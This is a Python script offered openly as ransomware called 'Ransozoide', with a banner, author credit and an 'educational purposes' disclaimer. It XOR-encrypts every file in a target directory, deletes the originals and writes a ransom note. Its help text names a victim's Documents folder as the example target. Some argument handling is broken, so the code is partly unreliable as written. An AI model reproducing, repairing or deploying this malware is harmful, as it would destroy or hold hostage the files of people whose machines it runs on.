
import os
import string
import random
import sys

def str_xor (s1, s2):

	return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])



menu = r'''
--------------------------------------------------------------------------------------------------
Special Thanks to: ArielFreud 

[!] Legal Disclaimer: usage of Ransozoide without prior mutual consistency can be considered as an 
	illegal activity. it is the final user's responsibility to obey all applicable local, state and 
	federal laws. author assume no liability and are not responsible for any misuse or damage caused 
	by this program.

	That was developed for educational purposes!

--------------------------------------------------------------------------------------------------
$$$$$$$\   $$$$$$\  $$\   $$\  $$$$$$\   $$$$$$\  $$$$$$$$\  $$$$$$\  $$$$$$\ $$$$$$$\  $$$$$$$$\ 
$$  __$$\ $$  __$$\ $$$\  $$ |$$  __$$\ $$  __$$\ \____$$  |$$  __$$\ \_$$  _|$$  __$$\ $$  _____|
$$ |  $$ |$$ /  $$ |$$$$\ $$ |$$ /  \__|$$ /  $$ |    $$  / $$ /  $$ |  $$ |  $$ |  $$ |$$ |      
$$$$$$$  |$$$$$$$$ |$$ $$\$$ |\$$$$$$\  $$ |  $$ |   $$  /  $$ |  $$ |  $$ |  $$ |  $$ |$$$$$\    
$$  __$$< $$  __$$ |$$ \$$$$ | \____$$\ $$ |  $$ |  $$  /   $$ |  $$ |  $$ |  $$ |  $$ |$$  __|   
$$ |  $$ |$$ |  $$ |$$ |\$$$ |$$\   $$ |$$ |  $$ | $$  /    $$ |  $$ |  $$ |  $$ |  $$ |$$ |      
$$ |  $$ |$$ |  $$ |$$ | \$$ |\$$$$$$  | $$$$$$  |$$$$$$$$\  $$$$$$  |$$$$$$\ $$$$$$$  |$$$$$$$$\ 
\__|  \__|\__|  \__|\__|  \__| \______/  \______/ \________| \______/ \______|\_______/ \________|

CODED BY: Sargastico

MY GIT: https://github.com/Sargastico
--------------------------------------------------------------------------------------------------
'''
print(menu+ '\n')

diretorio = str(sys.argv[2:])


#if (os.path.isdir(diretorio) == False):
	#sys.exit("The path provided do not exist! \n")

key = (''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(int(sys.argv[3:]))))

with open('key.txt', 'w') as w:
	w.write(key)
	w.close()

if (sys.argv[1:] == '-e'):

	arq = open('Leia-me!', 'w') 
	arq.write('OOOOPS!!! Your files are all encrypted! \n')
	arq.close()

	for files in os.listdir(diretorio):
		os.chdir(diretorio)

		with open(files, 'rb') as r:
			data = r.read()
			r.close()
			enc = str_xor(data, key.strip('\n'))
			new_file = '(encrypted)'+os.path.basename(files)

		with open(new_file, 'wb') as n:
			n.write(enc)
			n.close()

			os.remove(files)

elif (sys.argv[1:] == '-d'):

	for files in os.listdir(diretorio):
		os.chdir(diretorio)

		with open(files, 'rb') as r:
			data = r.read()
			r.close()
			dec = str_xor(data, key.strip('\n'))
			new_file = files.strip('(encrypted)')

		with open(new_file, 'wb') as n:
			n.write(dec)
			n.close()

			os.remove(files)

elif (sys.argv[1:] == '-h'):

	print(" -e : Command to run de encryptor script. \n -d : Command to run the decryptor script. \n [path] : should be like 'C:\\...\\...\\...\\ \n [key length] : is the length of the encryption key, more bigger, more hard to break! \n")
	print(" Example: \n ransozoide.py -e 'C:\\Users\\Victim\\Documents' 20000 \n ransozoide.py -d 'C:\\Users\\Victim\\Documents' 20000 \n")
	sys.exit("Exiting... \n")

else:

	print("How to use: 'ransozoide.py [-e/-d] [directory path] [key length] \n Type -h for more! \n")
	sys.exit("Exiting... \n")

